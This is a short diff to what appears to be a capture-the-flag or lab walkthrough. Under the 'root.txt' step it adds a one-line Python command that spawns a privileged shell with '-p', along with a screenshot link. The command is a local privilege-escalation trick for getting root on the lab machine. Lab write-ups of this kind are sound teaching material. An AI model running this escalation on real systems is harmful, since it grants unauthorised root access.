@@ -73,5 +73,9 @@ Set up environment IP as IP_Machine
 
 * root.txt
 
+	`/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+
+	![task4-root-txt](./images/task4-root-txt.png)
+
 
 
